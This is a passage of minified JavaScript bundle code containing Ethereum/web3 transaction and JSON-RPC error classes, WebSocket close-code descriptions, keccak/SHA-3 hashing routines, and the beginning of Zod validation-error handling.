                super("gas: ".concat(null !== (t = e.gas) && void 0 !== t ? t : "undefined", ", gasPrice: ").concat(null !== (n = e.gasPrice) && void 0 !== n ? n : "undefined", ", maxPriorityFeePerGas: ").concat(null !== (r = e.maxPriorityFeePerGas) && void 0 !== r ? r : "undefined", ", maxFeePerGas: ").concat(null !== (i = e.maxFeePerGas) && void 0 !== i ? i : "undefined"), '"gas" is missing'), this.code = 415, this.cause = new An
            }
        }
        class En extends Et {
            constructor() {
                super('Missing properties in transaction, either define "gas" and "gasPrice" for type 0 transactions or "gas", "maxPriorityFeePerGas" and "maxFeePerGas" for type 2 transactions, not both'), this.code = 441
            }
        }
        class Sn extends Ct {
            constructor(e) {
                var t, n, r, i;
                super("gas: ".concat(null !== (t = e.gas) && void 0 !== t ? t : "undefined", ", gasPrice: ").concat(null !== (n = e.gasPrice) && void 0 !== n ? n : "undefined", ", maxPriorityFeePerGas: ").concat(null !== (r = e.maxPriorityFeePerGas) && void 0 !== r ? r : "undefined", ", maxFeePerGas: ").concat(null !== (i = e.maxFeePerGas) && void 0 !== i ? i : "undefined"), "transaction must specify legacy or fee market gas properties, not both"), this.code = 434, this.cause = new En
            }
        }
        class Cn extends Ct {
            constructor(e) {
                var t, n;
                super("gas: ".concat(null !== (t = e.gas) && void 0 !== t ? t : "undefined", ", gasPrice: ").concat(null !== (n = e.gasPrice) && void 0 !== n ? n : "undefined"), "Gas or gasPrice is lower than 0"), this.code = 416
            }
        }
        class _n extends Ct {
            constructor(e) {
                var t, n;
                super("maxPriorityFeePerGas: ".concat(null !== (t = e.maxPriorityFeePerGas) && void 0 !== t ? t : "undefined", ", maxFeePerGas: ").concat(null !== (n = e.maxFeePerGas) && void 0 !== n ? n : "undefined"), "maxPriorityFeePerGas or maxFeePerGas is lower than 0"), this.code = 417
            }
        }
        class In extends Ct {
            constructor(e) {
                super(e, "eip-1559 transactions don't support gasPrice"), this.code = 418
            }
        }
        class Pn extends Ct {
            constructor(e) {
                var t, n;
                super("maxPriorityFeePerGas: ".concat(null !== (t = e.maxPriorityFeePerGas) && void 0 !== t ? t : "undefined", ", maxFeePerGas: ").concat(null !== (n = e.maxFeePerGas) && void 0 !== n ? n : "undefined"), "pre-eip-1559 transaction don't support maxFeePerGas/maxPriorityFeePerGas"), this.code = 419
            }
        }
        class Tn extends Ct {
            constructor(e) {
                super(e, "invalid transaction object"), this.code = 420
            }
        }
        class Bn extends Ct {
            constructor(e) {
                var t, n;
                super("nonce: ".concat(null !== (t = e.nonce) && void 0 !== t ? t : "undefined", ", chainId: ").concat(null !== (n = e.chainId) && void 0 !== n ? n : "undefined"), "Nonce or chainId is lower than 0"), this.code = 421
            }
        }
        class Nn extends Ct {
            constructor() {
                super("UnableToPopulateNonceError", "unable to populate nonce, no from address available"), this.code = 422
            }
        }
        class On extends Ct {
            constructor() {
                super("Eip1559NotSupportedError", "Network doesn't support eip-1559"), this.code = 423
            }
        }
        class Rn extends Ct {
            constructor(e) {
                super(e, "unsupported transaction type"), this.code = 424
            }
        }
        class Mn extends Ct {
            constructor(e) {
                var t, n;
                super("data: ".concat(null !== (t = e.data) && void 0 !== t ? t : "undefined", ", input: ").concat(null !== (n = e.input) && void 0 !== n ? n : "undefined"), 'You can\'t have "data" and "input" as properties of transactions at the same time, please use either "data" or "input" instead.'), this.code = 425
            }
        }
        class jn extends Et {
            constructor(e) {
                super("The connected Ethereum Node did not respond within ".concat(e.numberOfSeconds, " seconds, please make sure your transaction was properly sent and you are connected to a healthy Node. Be aware that transaction might still be pending or mined!\n\tTransaction Hash: ").concat(e.transactionHash ? e.transactionHash.toString() : "not available")), this.code = 431
            }
        }

        function Fn(e) {
            return "Please make sure your transaction was properly sent and there are no previous pending transaction for the same account. However, be aware that it might still be mined!\n\tTransaction Hash: ".concat(e ? e.toString() : "not available")
        }
        class Ln extends Et {
            constructor(e) {
                super("Transaction was not mined within ".concat(e.numberOfSeconds, " seconds. ").concat(Fn(e.transactionHash))), this.code = 426
            }
        }
        class Dn extends Et {
            constructor(e) {
                super("Transaction started at ".concat(e.starterBlockNumber, " but was not mined within ").concat(e.numberOfBlocks, " blocks. ").concat(Fn(e.transactionHash))), this.code = 432
            }
        }
        class Hn extends Ct {
            constructor(e) {
                var t, n;
                super("receipt: ".concat(JSON.stringify(e.receipt), ", blockHash: ").concat(null === (t = e.blockHash) || void 0 === t ? void 0 : t.toString(), ", transactionHash: ").concat(null === (n = e.transactionHash) || void 0 === n ? void 0 : n.toString()), "Receipt missing or blockHash null"), this.code = 427
            }
        }
        class Un extends Ct {
            constructor(e) {
                super("receipt: ".concat(JSON.stringify(e.receipt)), "Receipt missing block number"), this.code = 428
            }
        }
        class zn extends Et {
            constructor(e) {
                super('Invalid signature. "'.concat(e, '"')), this.code = 433
            }
        }
        class Gn extends Ct {
            constructor() {
                super("LocalWalletNotAvailableError", "Attempted to index account in local wallet, but no wallet is available"), this.code = 429
            }
        }
        class qn extends Et {
            constructor(e, t) {
                const n = [];
                e.forEach((e => n.push(e.keyword))), super("The following properties are invalid for the transaction type ".concat(t, ": ").concat(n.join(", "))), this.code = 439
            }
        }
        class Qn extends Ct {
            constructor(e) {
                super(e, "can not parse as byte data"), this.code = 1002
            }
        }
        class Wn extends Ct {
            constructor(e) {
                super(e, "can not parse as number data"), this.code = 1003
            }
        }
        class Vn extends Ct {
            constructor(e) {
                super(e, "invalid ethereum address"), this.code = 1005
            }
        }
        class Zn extends Ct {
            constructor(e) {
                super(e, "not a valid string"), this.code = 1001
            }
        }
        class Kn extends Ct {
            constructor(e) {
                super(e, "invalid unit"), this.code = 1004
            }
        }
        class Jn extends Ct {
            constructor(e) {
                super(e, "not a valid unit. Must be a positive integer"), this.code = 1015
            }
        }
        class Yn extends Ct {
            constructor(e) {
                super(e, "can not be converted to hex"), this.code = 1006
            }
        }
        class Xn extends Ct {
            constructor(e) {
                super(e, "value greater than the nibble width"), this.code = 1014
            }
        }
        class $n extends Ct {
            constructor(e) {
                super(e, "not a valid boolean."), this.code = 1008
            }
        }
        class er extends Ct {
            constructor(e) {
                super(e, "not a valid unsigned integer."), this.code = 1009
            }
        }
        class tr extends Ct {
            constructor(e) {
                super(e, "invalid size given."), this.code = 1010
            }
        }
        class nr extends Ct {
            constructor(e) {
                super(e, "value is larger than size."), this.code = 1011
            }
        }
        class rr extends Ct {
            constructor(e) {
                super(e, "invalid string given"), this.code = 1012
            }
        }
        const ir = e => (e => !Array.isArray(e) && "2.0" === e.jsonrpc && !!e && (void 0 === e.result || null === e.result) && "error" in e && ("number" === typeof e.id || "string" === typeof e.id))(e) ? e.error.message : "";
        class or extends Et {
            constructor(e, t, n) {
                var r;
                let i;
                super(null !== t && void 0 !== t ? t : "Returned error: ".concat(Array.isArray(e) ? e.map((e => ir(e))).join(",") : ir(e))), this.code = 100, t || (this.data = Array.isArray(e) ? e.map((e => {
                    var t;
                    return null === (t = e.error) || void 0 === t ? void 0 : t.data
                })) : null === (r = null === e || void 0 === e ? void 0 : e.error) || void 0 === r ? void 0 : r.data), this.request = n, "error" in e ? i = e.error : e instanceof Array && (i = e.filter((e => e.error)).map((e => e.error))), Array.isArray(i) && i.length > 0 ? this.cause = new St(i) : this.cause = i
            }
            toJSON() {
                return Object.assign(Object.assign({}, super.toJSON()), {
                    data: this.data,
                    request: this.request
                })
            }
        }
        class ar extends or {
            constructor(e, t) {
                let n;
                super(e, void 0, t), this.code = 101, "error" in e ? n = e.error : e instanceof Array && (n = e.map((e => e.error))), Array.isArray(n) ? this.cause = new St(n) : this.cause = n
            }
        }
        class sr extends Et {
            constructor(e, t) {
                super("Web3Config hardfork doesnt match in defaultHardfork ".concat(e, " and common.hardfork ").concat(t)), this.code = 1101
            }
        }
        class cr extends Et {
            constructor(e, t) {
                super("Web3Config chain doesnt match in defaultHardfork ".concat(e, " and common.hardfork ").concat(t)), this.code = 1101
            }
        }
        const lr = "An Rpc error has occured with a code of *code*",
            ur = {
                [ft]: {
                    message: "Parse error",
                    description: "Invalid JSON"
                },
                [ht]: {
                    message: "Invalid request",
                    description: "JSON is not a valid request object\t"
                },
                [pt]: {
                    message: "Method not found",
                    description: "Method does not exist\t"
                },
                [mt]: {
                    message: "Invalid params",
                    description: "Invalid method parameters"
                },
                [gt]: {
                    message: "Internal error",
                    description: "Internal JSON-RPC error"
                },
                [vt]: {
                    message: "Invalid input",
                    description: "Missing or invalid parameters"
                },
                [yt]: {
                    message: "Resource not found",
                    description: "Requested resource not found"
                },
                [bt]: {
                    message: "Resource unavailable",
                    description: "Requested resource not available"
                },
                [wt]: {
                    message: "Transaction rejected",
                    description: "Transaction creation failed"
                },
                [xt]: {
                    message: "Method not supported",
                    description: "Method is not implemented"
                },
                [At]: {
                    message: "Limit exceeded",
                    description: "Request exceeds defined limit"
                },
                [kt]: {
                    message: "JSON-RPC version not supported",
                    description: "Version of JSON-RPC protocol is not supported"
                },
                [st]: {
                    name: "User Rejected Request",
                    message: "The user rejected the request."
                },
                [ct]: {
                    name: "Unauthorized",
                    message: "The requested method and/or account has not been authorized by the user."
                },
                [lt]: {
                    name: "Unsupported Method",
                    message: "The Provider does not support the requested method."
                },
                [ut]: {
                    name: "Disconnected",
                    message: "The Provider is disconnected from all chains."
                },
                [dt]: {
                    name: "Chain Disconnected",
                    message: "The Provider is not connected to the requested chain."
                },
                "0-999": {
                    name: "",
                    message: "Not used."
                },
                1e3: {
                    name: "Normal Closure",
                    message: "The connection successfully completed the purpose for which it was created."
                },
                1001: {
                    name: "Going Away",
                    message: "The endpoint is going away, either because of a server failure or because the browser is navigating away from the page that opened the connection."
                },
                1002: {
                    name: "Protocol error",
                    message: "The endpoint is terminating the connection due to a protocol error."
                },
                1003: {
                    name: "Unsupported Data",
                    message: "The connection is being terminated because the endpoint received data of a type it cannot accept. (For example, a text-only endpoint received binary data.)"
                },
                1004: {
                    name: "Reserved",
                    message: "Reserved. A meaning might be defined in the future."
                },
                1005: {
                    name: "No Status Rcvd",
                    message: "Reserved. Indicates that no status code was provided even though one was expected."
                },
                1006: {
                    name: "Abnormal Closure",
                    message: "Reserved. Indicates that a connection was closed abnormally (that is, with no close frame being sent) when a status code is expected."
                },
                1007: {
                    name: "Invalid frame payload data",
                    message: "The endpoint is terminating the connection because a message was received that contained inconsistent data (e.g., non-UTF-8 data within a text message)."
                },
                1008: {
                    name: "Policy Violation",
                    message: "The endpoint is terminating the connection because it received a message that violates its policy. This is a generic status code, used when codes 1003 and 1009 are not suitable."
                },
                1009: {
                    name: "Message Too Big",
                    message: "The endpoint is terminating the connection because a data frame was received that is too large."
                },
                1010: {
                    name: "Mandatory Ext.",
                    message: "The client is terminating the connection because it expected the server to negotiate one or more extension, but the server didn't."
                },
                1011: {
                    name: "Internal Error",
                    message: "The server is terminating the connection because it encountered an unexpected condition that prevented it from fulfilling the request."
                },
                1012: {
                    name: "Service Restart",
                    message: "The server is terminating the connection because it is restarting."
                },
                1013: {
                    name: "Try Again Later",
                    message: "The server is terminating the connection due to a temporary condition, e.g. it is overloaded and is casting off some of its clients."
                },
                1014: {
                    name: "Bad Gateway",
                    message: "The server was acting as a gateway or proxy and received an invalid response from the upstream server. This is similar to 502 HTTP Status Code."
                },
                1015: {
                    name: "TLS handshake",
                    message: "Reserved. Indicates that the connection was closed due to a failure to perform a TLS handshake (e.g., the server certificate can't be verified)."
                },
                "1016-2999": {
                    name: "",
                    message: "For definition by future revisions of the WebSocket Protocol specification, and for definition by extension specifications."
                },
                "3000-3999": {
                    name: "",
                    message: "For use by libraries, frameworks, and applications. These status codes are registered directly with IANA. The interpretation of these codes is undefined by the WebSocket protocol."
                },
                "4000-4999": {
                    name: "",
                    message: "For private use, and thus can't be registered. Such codes can be used by prior agreements between WebSocket applications. The interpretation of these codes is undefined by the WebSocket protocol."
                }
            };
        class dr extends Et {
            constructor(e, t) {
                super(null !== t && void 0 !== t ? t : lr.replace("*code*", e.error.code.toString())), this.code = e.error.code, this.id = e.id, this.jsonrpc = e.jsonrpc, this.jsonRpcError = e.error
            }
            toJSON() {
                return Object.assign(Object.assign({}, super.toJSON()), {
                    error: this.jsonRpcError,
                    id: this.id,
                    jsonRpc: this.jsonrpc
                })
            }
        }
        class fr extends Et {
            constructor(e, t) {
                var n, r, i, o;
                if (e)
                    if (null === (n = ur[e]) || void 0 === n ? void 0 : n.message) super(ur[e].message);
                    else {
                        const t = Object.keys(ur).find((t => "string" === typeof t && e >= parseInt(t.split("-")[0], 10) && e <= parseInt(t.split("-")[1], 10)));
                        super(null !== (i = null === (r = ur[null !== t && void 0 !== t ? t : ""]) || void 0 === r ? void 0 : r.message) && void 0 !== i ? i : lr.replace("*code*", null !== (o = null === e || void 0 === e ? void 0 : e.toString()) && void 0 !== o ? o : '""'))
                    }
                else super();
                this.code = e, this.data = t
            }
        }
        const hr = new Map;
        hr.set(ft, {
            error: class extends dr {
                constructor(e) {
                    super(e, ur[-32700].message), this.code = ft
                }
            }
        }), hr.set(ht, {
            error: class extends dr {
                constructor(e) {
                    super(e, ur[-32600].message), this.code = ht
                }
            }
        }), hr.set(pt, {
            error: class extends dr {
                constructor(e) {
                    super(e, ur[-32601].message), this.code = pt
                }
            }
        }), hr.set(mt, {
            error: class extends dr {
                constructor(e) {
                    super(e, ur[-32602].message), this.code = mt
                }
            }
        }), hr.set(gt, {
            error: class extends dr {
                constructor(e) {
                    super(e, ur[-32603].message), this.code = gt
                }
            }
        }), hr.set(vt, {
            error: class extends dr {
                constructor(e) {
                    super(e, ur[-32e3].message), this.code = vt
                }
            }
        }), hr.set(xt, {
            error: class extends dr {
                constructor(e) {
                    super(e, ur[-32004].message), this.code = xt
                }
            }
        }), hr.set(bt, {
            error: class extends dr {
                constructor(e) {
                    super(e, ur[-32002].message), this.code = bt
                }
            }
        }), hr.set(wt, {
            error: class extends dr {
                constructor(e) {
                    super(e, ur[-32003].message), this.code = wt
                }
            }
        }), hr.set(yt, {
            error: class extends dr {
                constructor(e) {
                    super(e, ur[-32001].message), this.code = yt
                }
            }
        }), hr.set(kt, {
            error: class extends dr {
                constructor(e) {
                    super(e, ur[-32006].message), this.code = kt
                }
            }
        }), hr.set(At, {
            error: class extends dr {
                constructor(e) {
                    super(e, ur[-32005].message), this.code = At
                }
            }
        });
        class pr extends Et {
            constructor(e) {
                super("Format for the type ".concat(e, " is unsupported")), this.type = e, this.code = 1200
            }
            toJSON() {
                return Object.assign(Object.assign({}, super.toJSON()), {
                    type: this.type
                })
            }
        }

        function mr(e) {
            if (!Number.isSafeInteger(e) || e < 0) throw new Error("Wrong positive integer: ".concat(e))
        }

        function gr(e) {
            if (!((t = e) instanceof Uint8Array || null != t && "object" === typeof t && "Uint8Array" === t.constructor.name)) throw new Error("Expected Uint8Array");
            for (var t, n = arguments.length, r = new Array(n > 1 ? n - 1 : 0), i = 1; i < n; i++) r[i - 1] = arguments[i];
            if (r.length > 0 && !r.includes(e.length)) throw new Error("Expected Uint8Array of length ".concat(r, ", not of length=").concat(e.length))
        }

        function vr(e) {
            if ("function" !== typeof e || "function" !== typeof e.create) throw new Error("Hash should be wrapped by utils.wrapConstructor");
            mr(e.outputLen), mr(e.blockLen)
        }

        function yr(e) {
            let t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
            if (e.destroyed) throw new Error("Hash instance has been destroyed");
            if (t && e.finished) throw new Error("Hash#digest() has already been called")
        }

        function br(e, t) {
            gr(e);
            const n = t.outputLen;
            if (e.length < n) throw new Error("digestInto() expects output buffer of length at least ".concat(n))
        }
        const wr = {
                number: mr,
                bool: function(e) {
                    if ("boolean" !== typeof e) throw new Error("Expected boolean, not ".concat(e))
                },
                bytes: gr,
                hash: vr,
                exists: yr,
                output: br
            },
            xr = wr,
            Ar = BigInt(2 ** 32 - 1),
            kr = BigInt(32);

        function Er(e) {
            return arguments.length > 1 && void 0 !== arguments[1] && arguments[1] ? {
                h: Number(e & Ar),
                l: Number(e >> kr & Ar)
            } : {
                h: 0 | Number(e >> kr & Ar),
                l: 0 | Number(e & Ar)
            }
        }

        function Sr(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1],
                n = new Uint32Array(e.length),
                r = new Uint32Array(e.length);
            for (let i = 0; i < e.length; i++) {
                const {
                    h: o,
                    l: a
                } = Er(e[i], t);
                [n[i], r[i]] = [o, a]
            }
            return [n, r]
        }
        const Cr = (e, t, n) => e << n | t >>> 32 - n,
            _r = (e, t, n) => t << n | e >>> 32 - n,
            Ir = (e, t, n) => t << n - 32 | e >>> 64 - n,
            Pr = (e, t, n) => e << n - 32 | t >>> 64 - n;
        const Tr = {
                fromBig: Er,
                split: Sr,
                toBig: (e, t) => BigInt(e >>> 0) << kr | BigInt(t >>> 0),
                shrSH: (e, t, n) => e >>> n,
                shrSL: (e, t, n) => e << 32 - n | t >>> n,
                rotrSH: (e, t, n) => e >>> n | t << 32 - n,
                rotrSL: (e, t, n) => e << 32 - n | t >>> n,
                rotrBH: (e, t, n) => e << 64 - n | t >>> n - 32,
                rotrBL: (e, t, n) => e >>> n - 32 | t << 64 - n,
                rotr32H: (e, t) => t,
                rotr32L: (e, t) => e,
                rotlSH: Cr,
                rotlSL: _r,
                rotlBH: Ir,
                rotlBL: Pr,
                add: function(e, t, n, r) {
                    const i = (t >>> 0) + (r >>> 0);
                    return {
                        h: e + n + (i / 2 ** 32 | 0) | 0,
                        l: 0 | i
                    }
                },
                add3L: (e, t, n) => (e >>> 0) + (t >>> 0) + (n >>> 0),
                add3H: (e, t, n, r) => t + n + r + (e / 2 ** 32 | 0) | 0,
                add4L: (e, t, n, r) => (e >>> 0) + (t >>> 0) + (n >>> 0) + (r >>> 0),
                add4H: (e, t, n, r, i) => t + n + r + i + (e / 2 ** 32 | 0) | 0,
                add5H: (e, t, n, r, i, o) => t + n + r + i + o + (e / 2 ** 32 | 0) | 0,
                add5L: (e, t, n, r, i) => (e >>> 0) + (t >>> 0) + (n >>> 0) + (r >>> 0) + (i >>> 0)
            },
            Br = Tr,
            Nr = "object" === typeof globalThis && "crypto" in globalThis ? globalThis.crypto : void 0,
            Or = e => new Uint32Array(e.buffer, e.byteOffset, Math.floor(e.byteLength / 4));

        function Rr(e) {
            return e instanceof Uint8Array || null != e && "object" === typeof e && "Uint8Array" === e.constructor.name
        }
        const Mr = e => new DataView(e.buffer, e.byteOffset, e.byteLength),
            jr = (e, t) => e << 32 - t | e >>> t;
        if (!(68 === new Uint8Array(new Uint32Array([287454020]).buffer)[0])) throw new Error("Non little-endian hardware is not supported");

        function Fr(e) {
            if ("string" !== typeof e) throw new Error("utf8ToBytes expected string, got ".concat(typeof e));
            return new Uint8Array((new TextEncoder).encode(e))
        }

        function Lr(e) {
            if ("string" === typeof e && (e = Fr(e)), !Rr(e)) throw new Error("expected Uint8Array, got ".concat(typeof e));
            return e
        }

        function Dr() {
            let e = 0;
            for (let n = 0; n < arguments.length; n++) {
                const t = n < 0 || arguments.length <= n ? void 0 : arguments[n];
                if (!Rr(t)) throw new Error("Uint8Array expected");
                e += t.length
            }
            const t = new Uint8Array(e);
            for (let n = 0, r = 0; n < arguments.length; n++) {
                const e = n < 0 || arguments.length <= n ? void 0 : arguments[n];
                t.set(e, r), r += e.length
            }
            return t
        }
        class Hr {
            clone() {
                return this._cloneInto()
            }
        }
        const Ur = {}.toString;

        function zr(e, t) {
            if (void 0 !== t && "[object Object]" !== Ur.call(t)) throw new Error("Options should be object or undefined");
            return Object.assign(e, t)
        }

        function Gr(e) {
            const t = t => e().update(Lr(t)).digest(),
                n = e();
            return t.outputLen = n.outputLen, t.blockLen = n.blockLen, t.create = () => e(), t
        }

        function qr() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 32;
            if (Nr && "function" === typeof Nr.getRandomValues) return Nr.getRandomValues(new Uint8Array(e));
            throw new Error("crypto.getRandomValues must be defined")
        }
        const [Qr, Wr, Vr] = [
            [],
            [],
            []
        ], Zr = BigInt(0), Kr = BigInt(1), Jr = BigInt(2), Yr = BigInt(7), Xr = BigInt(256), $r = BigInt(113);
        for (let n = 0, Wy = Kr, Vy = 1, Zy = 0; n < 24; n++) {
            [Vy, Zy] = [Zy, (2 * Vy + 3 * Zy) % 5], Qr.push(2 * (5 * Zy + Vy)), Wr.push((n + 1) * (n + 2) / 2 % 64);
            let e = Zr;
            for (let t = 0; t < 7; t++) Wy = (Wy << Kr ^ (Wy >> Yr) * $r) % Xr, Wy & Jr && (e ^= Kr << (Kr << BigInt(t)) - Kr);
            Vr.push(e)
        }
        const [ei, ti] = Sr(Vr, !0), ni = (e, t, n) => n > 32 ? Ir(e, t, n) : Cr(e, t, n), ri = (e, t, n) => n > 32 ? Pr(e, t, n) : _r(e, t, n);
        class ii extends Hr {
            constructor(e, t, n) {
                let r = arguments.length > 3 && void 0 !== arguments[3] && arguments[3],
                    i = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : 24;
                if (super(), this.blockLen = e, this.suffix = t, this.outputLen = n, this.enableXOF = r, this.rounds = i, this.pos = 0, this.posOut = 0, this.finished = !1, this.destroyed = !1, mr(n), 0 >= this.blockLen || this.blockLen >= 200) throw new Error("Sha3 supports only keccak-f1600 function");
                this.state = new Uint8Array(200), this.state32 = Or(this.state)
            }
            keccak() {
                ! function(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 24;
                    const n = new Uint32Array(10);
                    for (let r = 24 - t; r < 24; r++) {
                        for (let r = 0; r < 10; r++) n[r] = e[r] ^ e[r + 10] ^ e[r + 20] ^ e[r + 30] ^ e[r + 40];
                        for (let r = 0; r < 10; r += 2) {
                            const t = (r + 8) % 10,
                                i = (r + 2) % 10,
                                o = n[i],
                                a = n[i + 1],
                                s = ni(o, a, 1) ^ n[t],
                                c = ri(o, a, 1) ^ n[t + 1];
                            for (let n = 0; n < 50; n += 10) e[r + n] ^= s, e[r + n + 1] ^= c
                        }
                        let t = e[2],
                            i = e[3];
                        for (let n = 0; n < 24; n++) {
                            const r = Wr[n],
                                o = ni(t, i, r),
                                a = ri(t, i, r),
                                s = Qr[n];
                            t = e[s], i = e[s + 1], e[s] = o, e[s + 1] = a
                        }
                        for (let r = 0; r < 50; r += 10) {
                            for (let t = 0; t < 10; t++) n[t] = e[r + t];
                            for (let t = 0; t < 10; t++) e[r + t] ^= ~n[(t + 2) % 10] & n[(t + 4) % 10]
                        }
                        e[0] ^= ei[r], e[1] ^= ti[r]
                    }
                    n.fill(0)
                }(this.state32, this.rounds), this.posOut = 0, this.pos = 0
            }
            update(e) {
                yr(this);
                const {
                    blockLen: t,
                    state: n
                } = this, r = (e = Lr(e)).length;
                for (let i = 0; i < r;) {
                    const o = Math.min(t - this.pos, r - i);
                    for (let t = 0; t < o; t++) n[this.pos++] ^= e[i++];
                    this.pos === t && this.keccak()
                }
                return this
            }
            finish() {
                if (this.finished) return;
                this.finished = !0;
                const {
                    state: e,
                    suffix: t,
                    pos: n,
                    blockLen: r
                } = this;
                e[n] ^= t, 0 !== (128 & t) && n === r - 1 && this.keccak(), e[r - 1] ^= 128, this.keccak()
            }
            writeInto(e) {
                yr(this, !1), gr(e), this.finish();
                const t = this.state,
                    {
                        blockLen: n
                    } = this;
                for (let r = 0, i = e.length; r < i;) {
                    this.posOut >= n && this.keccak();
                    const o = Math.min(n - this.posOut, i - r);
                    e.set(t.subarray(this.posOut, this.posOut + o), r), this.posOut += o, r += o
                }
                return e
            }
            xofInto(e) {
                if (!this.enableXOF) throw new Error("XOF is not possible for this instance");
                return this.writeInto(e)
            }
            xof(e) {
                return mr(e), this.xofInto(new Uint8Array(e))
            }
            digestInto(e) {
                if (br(e, this), this.finished) throw new Error("digest() was already called");
                return this.writeInto(e), this.destroy(), e
            }
            digest() {
                return this.digestInto(new Uint8Array(this.outputLen))
            }
            destroy() {
                this.destroyed = !0, this.state.fill(0)
            }
            _cloneInto(e) {
                const {
                    blockLen: t,
                    suffix: n,
                    outputLen: r,
                    rounds: i,
                    enableXOF: o
                } = this;
                return e || (e = new ii(t, n, r, o, i)), e.state32.set(this.state32), e.pos = this.pos, e.posOut = this.posOut, e.finished = this.finished, e.rounds = i, e.suffix = n, e.outputLen = r, e.enableXOF = o, e.destroyed = this.destroyed, e
            }
        }
        const oi = (e, t, n) => Gr((() => new ii(t, e, n))),
            ai = oi(1, 144, 28),
            si = oi(1, 136, 32),
            ci = oi(1, 104, 48),
            li = oi(1, 72, 64),
            ui = (xr.bool, xr.bytes);

        function di(e) {
            if (!(e instanceof Uint8Array)) throw new TypeError("bytesToUtf8 expected Uint8Array, got ".concat(typeof e));
            return (new TextDecoder).decode(e)
        }

        function fi(e) {
            return t => (xr.bytes(t), e(t))
        }(() => {
            const e = "object" === typeof globalThis && "crypto" in globalThis ? globalThis.crypto : void 0,
                t = "undefined" !== typeof module && "function" === typeof module.require && module.require.bind(module);
            t && !e && t("crypto")
        })(), fi(ai);
        const hi = (() => {
            const e = fi(si);
            return e.create = si.create, e
        })();
        fi(ci), fi(li);
        var pi, mi;
        ! function(e) {
            e.assertEqual = e => e, e.assertIs = function(e) {}, e.assertNever = function(e) {
                throw new Error
            }, e.arrayToEnum = e => {
                const t = {};
                for (const n of e) t[n] = n;
                return t
            }, e.getValidEnumValues = t => {
                const n = e.objectKeys(t).filter((e => "number" !== typeof t[t[e]])),
                    r = {};
                for (const e of n) r[e] = t[e];
                return e.objectValues(r)
            }, e.objectValues = t => e.objectKeys(t).map((function(e) {
                return t[e]
            })), e.objectKeys = "function" === typeof Object.keys ? e => Object.keys(e) : e => {
                const t = [];
                for (const n in e) Object.prototype.hasOwnProperty.call(e, n) && t.push(n);
                return t
            }, e.find = (e, t) => {
                for (const n of e)
                    if (t(n)) return n
            }, e.isInteger = "function" === typeof Number.isInteger ? e => Number.isInteger(e) : e => "number" === typeof e && isFinite(e) && Math.floor(e) === e, e.joinValues = function(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : " | ";
                return e.map((e => "string" === typeof e ? "'".concat(e, "'") : e)).join(t)
            }, e.jsonStringifyReplacer = (e, t) => "bigint" === typeof t ? t.toString() : t
        }(pi || (pi = {})),
        function(e) {
            e.mergeShapes = (e, t) => ({ ...e,
                ...t
            })
        }(mi || (mi = {}));
        const gi = pi.arrayToEnum(["string", "nan", "number", "integer", "float", "boolean", "date", "bigint", "symbol", "function", "undefined", "null", "array", "object", "unknown", "promise", "void", "never", "map", "set"]),
            vi = e => {
                switch (typeof e) {
                    case "undefined":
                        return gi.undefined;
                    case "string":
                        return gi.string;
                    case "number":
                        return isNaN(e) ? gi.nan : gi.number;
                    case "boolean":
                        return gi.boolean;
                    case "function":
                        return gi.function;
                    case "bigint":
                        return gi.bigint;
                    case "symbol":
                        return gi.symbol;
                    case "object":
                        return Array.isArray(e) ? gi.array : null === e ? gi.null : e.then && "function" === typeof e.then && e.catch && "function" === typeof e.catch ? gi.promise : "undefined" !== typeof Map && e instanceof Map ? gi.map : "undefined" !== typeof Set && e instanceof Set ? gi.set : "undefined" !== typeof Date && e instanceof Date ? gi.date : gi.object;
                    default:
                        return gi.unknown
                }
            },
            yi = pi.arrayToEnum(["invalid_type", "invalid_literal", "custom", "invalid_union", "invalid_union_discriminator", "invalid_enum_value", "unrecognized_keys", "invalid_arguments", "invalid_return_type", "invalid_date", "invalid_string", "too_small", "too_big", "invalid_intersection_types", "not_multiple_of", "not_finite"]);
        class bi extends Error {
            constructor(e) {
                var t;
                super(), t = this, this.issues = [], this.addIssue = e => {
                    this.issues = [...this.issues, e]
                }, this.addIssues = function() {
                    let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : [];
                    t.issues = [...t.issues, ...e]
                };
                const n = new.target.prototype;
                Object.setPrototypeOf ? Object.setPrototypeOf(this, n) : this.__proto__ = n, this.name = "ZodError", this.issues = e
            }
            get errors() {
                return this.issues
            }
            format(e) {
                const t = e || function(e) {
                        return e.message
                    },
                    n = {
                        _errors: []
                    },
                    r = e => {
                        for (const i of e.issues)
                            if ("invalid_union" === i.code) i.unionErrors.map(r);
                            else if ("invalid_return_type" === i.code) r(i.returnTypeError);
                        else if ("invalid_arguments" === i.code) r(i.argumentsError);
                        else if (0 === i.path.length) n._errors.push(t(i));
                        else {
                            let e = n,
                                r = 0;
                            for (; r < i.path.length;) {
                                const n = i.path[r];
                                r === i.path.length - 1 ? (e[n] = e[n] || {
                                    _errors: []
                                }, e[n]._errors.push(t(i))) : e[n] = e[n] || {
                                    _errors: []
                                }, e = e[n], r++
                            }
                        }
                    };
                return r(this), n
            }
            toString() {
                return this.message
            }
            get message() {
                return JSON.stringify(this.issues, pi.jsonStringifyReplacer, 2)
            }
            get isEmpty() {
                return 0 === this.issues.length
            }
            flatten() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : e => e.message;
                const t = {},
                    n = [];
                for (const r of this.issues) r.path.length > 0 ? (t[r.path[0]] = t[r.path[0]] || [], t[r.path[0]].push(e(r))) : n.push(e(r));
                return {
                    formErrors: n,
                    fieldErrors: t
                }
            }
            get formErrors() {
                return this.flatten()
            }
        }
        bi.create = e => new bi(e);
        const wi = (e, t) => {
            let n;
            switch (e.code) {
                case yi.invalid_type:
                    n = e.received === gi.undefined ? "Required" : "Expected ".concat(e.expected, ", received ").concat(e.received);
                    break;
                case yi.invalid_literal:
                    n = "Invalid literal value, expected ".concat(JSON.stringify(e.expected, pi.jsonStringifyReplacer));
                    break;
                case yi.unrecognized_keys:
                    n = "Unrecognized key(s) in object: ".concat(pi.joinValues(e.keys, ", "));
                    break;
                case yi.invalid_union:
                    n = "Invalid input";
                    break;
                case yi.invalid_union_discriminator:
